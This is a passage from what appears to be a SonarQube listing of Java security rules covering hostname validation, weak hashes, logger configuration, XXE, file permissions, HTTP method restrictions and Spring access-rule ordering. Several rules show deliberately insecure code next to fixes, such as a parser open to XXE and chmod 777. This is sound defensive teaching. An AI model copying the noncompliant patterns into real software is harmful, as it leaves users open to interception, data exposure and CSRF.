and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Apache Commons Email</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled because <code>setSSLCheckServerIdentity</code> is omitted. To enable validation, set it to
<code>true</code>.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import org.apache.commons.mail.DefaultAuthenticator;
import org.apache.commons.mail.Email;
import org.apache.commons.mail.SimpleEmail;

public void sendMail(String message) {
    Email email &#61; new SimpleEmail();

    email.setMsg(message);
    email.setSmtpPort(465);
    email.setAuthenticator(new DefaultAuthenticator(username, password));
    email.setSSLOnConnect(true); // Noncompliant

    email.send();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import org.apache.commons.mail.DefaultAuthenticator;
import org.apache.commons.mail.Email;
import org.apache.commons.mail.SimpleEmail;

public void sendMail(String message) {
    Email email &#61; new SimpleEmail();

    email.setMsg(message);
    email.setSmtpPort(465);
    email.setAuthenticator(new DefaultAuthenticator(username, password));
    email.setSSLCheckServerIdentity(true);
    email.setSSLOnConnect(true);

    email.send();
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms" rel="nofollow">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4790">
              java:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
MessageDigest md1 &#61; MessageDigest.getInstance(&#34;SHA&#34;);  // Sensitive:  SHA is not a standard name, for most security providers it&#39;s an alias of SHA-1
MessageDigest md2 &#61; MessageDigest.getInstance(&#34;SHA1&#34;);  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md1 &#61; MessageDigest.getInstance(&#34;SHA-512&#34;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4792">
              java:S4792
            </a>
          </td>
          <td>
            <details>
              <p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0285" rel="nofollow">CVE-2018-0285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2000-1127" rel="nofollow">CVE-2000-1127</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-15113" rel="nofollow">CVE-2017-15113</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-5742" rel="nofollow">CVE-2015-5742</a> </li></ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul><li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li><li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li></ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li><li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li><li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li><li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li><li> the logs are only stored locally instead of being backuped or replicated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Check that your production deployment doesn’t have its loggers in &#34;debug&#34; mode as it might write sensitive information in logs. </li><li> Production logs should be stored in a secure location which is only accessible to system administrators. </li><li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li><li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li><li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li><li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li></ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul><li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li><li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li><li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li><li> Monitor the logs for any suspicious activity. </li></ul>
<h2>Sensitive Code Example</h2>
<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>
<pre>
// &#61;&#61;&#61; Log4J 2 &#61;&#61;&#61;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.*;
import org.apache.logging.log4j.core.config.*;

// Sensitive: creating a new custom configuration
abstract class CustomConfigFactory extends ConfigurationFactory {
    // ...
}

class A {
    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,
            Appender appender, java.io.InputStream stream, java.net.URI uri,
            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)
            throws java.io.IOException {
        // Creating a new custom configuration
        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive

        // Setting loggers level can result in writing sensitive information in production
        Configurator.setAllLevels(&#34;com.example&#34;, Level.DEBUG);  // Sensitive
        Configurator.setLevel(&#34;com.example&#34;, Level.DEBUG);  // Sensitive
        Configurator.setLevel(levelMap);  // Sensitive
        Configurator.setRootLevel(Level.DEBUG);  // Sensitive

        config.addAppender(appender); // Sensitive: this modifies the configuration

        LoggerConfig loggerConfig &#61; config.getRootLogger();
        loggerConfig.addAppender(appender, level, filter); // Sensitive
        loggerConfig.setLevel(level); // Sensitive

        context.setConfigLocation(uri); // Sensitive

        // Load the configuration from a stream or file
        new ConfigurationSource(stream);  // Sensitive
        new ConfigurationSource(stream, file);  // Sensitive
        new ConfigurationSource(stream, url);  // Sensitive
        ConfigurationSource.fromResource(source, loader);  // Sensitive
        ConfigurationSource.fromUri(uri);  // Sensitive
    }
}
</pre>
<pre>
// &#61;&#61;&#61; java.util.logging &#61;&#61;&#61;
import java.util.logging.*;

class M {
    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)
            throws SecurityException, java.io.IOException {
        logManager.readConfiguration(is); // Sensitive

        logger.setLevel(Level.FINEST); // Sensitive
        logger.addHandler(handler); // Sensitive
    }
}
</pre>
<pre>
// &#61;&#61;&#61; Logback &#61;&#61;&#61;
import ch.qos.logback.classic.util.ContextInitializer;
import ch.qos.logback.core.Appender;
import ch.qos.logback.classic.joran.JoranConfigurator;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.classic.*;

class M {
    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {
        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, &#34;config.xml&#34;); // Sensitive
        JoranConfigurator configurator &#61; new JoranConfigurator(); // Sensitive

        logger.addAppender(fileAppender); // Sensitive
        logger.setLevel(Level.DEBUG); // Sensitive
    }
}
</pre>
<h2>Exceptions</h2>
<p>Log4J 1.x is not covered as it has reached <a href="https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces" rel="nofollow">end of
life</a>.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Information Exposure Through Log Files </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2755">
              java:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance(); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Protection from XXE can be done in several different ways. Choose one depending on how the affected parser object is used in your code.</p>
<p><strong>1.</strong> The first way is to completely disable <code>DOCTYPE</code> declarations:</p>
<pre>
// Applicable to:
// - DocumentBuilderFactory
// - SAXParserFactory
// - SchemaFactory
factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);

// For XMLInputFactory:
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
</pre>
<p><strong>2.</strong> Disable external entity declarations completely:</p>
<pre>
// Applicable to:
// - DocumentBuilderFactory
// - SAXParserFactory
factory.setFeature(&#34;http://xml.org/sax/features/external-general-entities&#34;, false);
factory.setFeature(&#34;http://xml.org/sax/features/external-parameter-entities&#34;, false);

// For XMLInputFactory:
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);
</pre>
<p><strong>3.</strong> Prohibit the use of all protocols by external entities:</p>
<pre>
// &#96;setAttribute&#96; variant, applicable to:
// - DocumentBuilderFactory
// - TransformerFactory
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &#34;&#34;);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &#34;&#34;);

// &#96;setProperty&#96; variant, applicable to:
// - XMLInputFactory
// - SchemaFactory
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &#34;&#34;);
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &#34;&#34;);

// For SAXParserFactory, the prohibition is done on child objects:
SAXParser parser &#61; factory.newSAXParser();
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &#34;&#34;);
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &#34;&#34;);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h3>Going the extra mile</h3>
<h4>Disable entity expansion</h4>
<p>Specifically for <code>DocumentBuilderFactory</code>, it is possible to disable the entity expansion. Note, however, that this does not prevent the
retrieval of external entities.</p>
<pre>
factory.setExpandEntityReferences(false);
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2612">
              java:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<pre>
    public void setPermissions(String filePath) {
        Set&lt;PosixFilePermission&gt; perms &#61; new HashSet&lt;PosixFilePermission&gt;();
        // user permission
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        // group permissions
        perms.add(PosixFilePermission.GROUP_READ);
        perms.add(PosixFilePermission.GROUP_EXECUTE);
        // others permissions
        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive
        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive
        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive

        Files.setPosixFilePermissions(Paths.get(filePath), perms);
    }
</pre>
<pre>
    public void setPermissionsUsingRuntimeExec(String filePath) {
        Runtime.getRuntime().exec(&#34;chmod 777 file.json&#34;); // Sensitive
    }
</pre>
<pre>
    public void setOthersPermissionsHardCoded(String filePath ) {
        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString(&#34;rwxrwxrwx&#34;)); // Sensitive
    }
</pre>
<h2>Compliant Solution</h2>
<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>
<pre>
    public void setPermissionsSafe(String filePath) throws IOException {
        Set&lt;PosixFilePermission&gt; perms &#61; new HashSet&lt;PosixFilePermission&gt;();
        // user permission
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        // group permissions
        perms.add(PosixFilePermission.GROUP_READ);
        perms.add(PosixFilePermission.GROUP_EXECUTE);
        // others permissions removed
        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant
        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant
        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant

        Files.setPosixFilePermissions(Paths.get(filePath), perms);
    }
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO01-J.</a> -
  Create files with appropriate access permissions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S3752">
              java:S3752
            </a>
          </td>
          <td>
            <details>
              <p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to
change the state of an application, for instance to update a user’s profile on a web application.</p>
<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>
<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>
<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF
protections are most of the time only protecting operations performed by unsafe HTTP methods.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> HTTP methods are not defined at all for a route/controller of the application. </li><li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be
used to perform read-only operations.</p>
<h2>Sensitive Code Example</h2>
<pre>
&#64;RequestMapping(&#34;/delete_user&#34;)  // Sensitive: by default all HTTP methods are allowed
public String delete1(String username) {
// state of the application will be changed here
}

&#64;RequestMapping(path &#61; &#34;/delete_user&#34;, method &#61; {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed
String delete2(&#64;RequestParam(&#34;id&#34;) String id) {
// state of the application will be changed here
}
</pre>
<h2>Compliant Solution</h2>
<pre>
&#64;RequestMapping(&#34;/delete_user&#34;, method &#61; RequestMethod.POST)  // Compliant
public String delete1(String username) {
// state of the application will be changed here
}

&#64;RequestMapping(path &#61; &#34;/delete_user&#34;, method &#61; RequestMethod.POST) // Compliant
String delete2(&#64;RequestParam(&#34;id&#34;) String id) {
// state of the application will be changed here
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs" rel="nofollow">Spring Security Official
  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4601">
              java:S4601
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>URL patterns configured on a <code>HttpSecurity.authorizeRequests()</code> method are considered in the order they were declared. It’s easy to make
a mistake and declare a less restrictive configuration before a more restrictive one. Therefore, it’s required to review the order of the
&#34;antMatchers&#34; declarations. The <code>/**</code> one should be the last one if it is declared.</p>
<p>This rule raises an issue when:</p>
<ul><li> A pattern is preceded by another that ends with <code>**</code> and has the same beginning. E.g.: <code>/page*-admin/db/**</code> is after
  <code>/page*-admin/**</code> </li><li> A pattern without wildcard characters is preceded by another that matches. E.g.: <code>/page-index/db</code> is after <code>/page*/**</code>
  </li></ul>
<h3>Noncompliant code example</h3>
<pre>
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers(&#34;/resources/**&#34;, &#34;/signup&#34;, &#34;/about&#34;).permitAll() // Compliant
      .antMatchers(&#34;/admin/**&#34;).hasRole(&#34;ADMIN&#34;)
      .antMatchers(&#34;/admin/login&#34;).permitAll() // Noncompliant; the pattern &#34;/admin/login&#34; should appear before &#34;/admin/**&#34;
      .antMatchers(&#34;/**&#34;, &#34;/home&#34;).permitAll()
      .antMatchers(&#34;/db/**&#34;).access(&#34;hasRole(&#39;ADMIN&#39;) and hasRole(&#39;DBA&#39;)&#34;) // Noncompliant; the pattern &#34;/db/**&#34; should occurs before &#34;/**&#34;
      .and().formLogin().loginPage(&#34;/login&#34;).permitAll().and().logout().permitAll();
  }
</pre>
<h3>Compliant solution</h3>
<pre>
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers(&#34;/resources/**&#34;, &#34;/signup&#34;, &#34;/about&#34;).permitAll() // Compliant
      .antMatchers(&#34;/admin/login&#34;).permitAll()
      .antMatchers(&#34;/admin/**&#34;).hasRole(&#34;ADMIN&#34;) // Compliant
      .antMatchers(&#34;/db/**&#34;).access(&#34;hasRole(&#39;ADMIN&#39;) and hasRole(&#39;DBA&#39;)&#34;)
      .antMatchers(&#34;/**&#34;, &#34;/home&#34;).permitAll() // Compliant; &#34;/**&#34; is the last one
      .and().formLogin().loginPage(&#34;/login&#34;).permitAll().and().logout().permitAll();
  }
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S1313">
              java:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
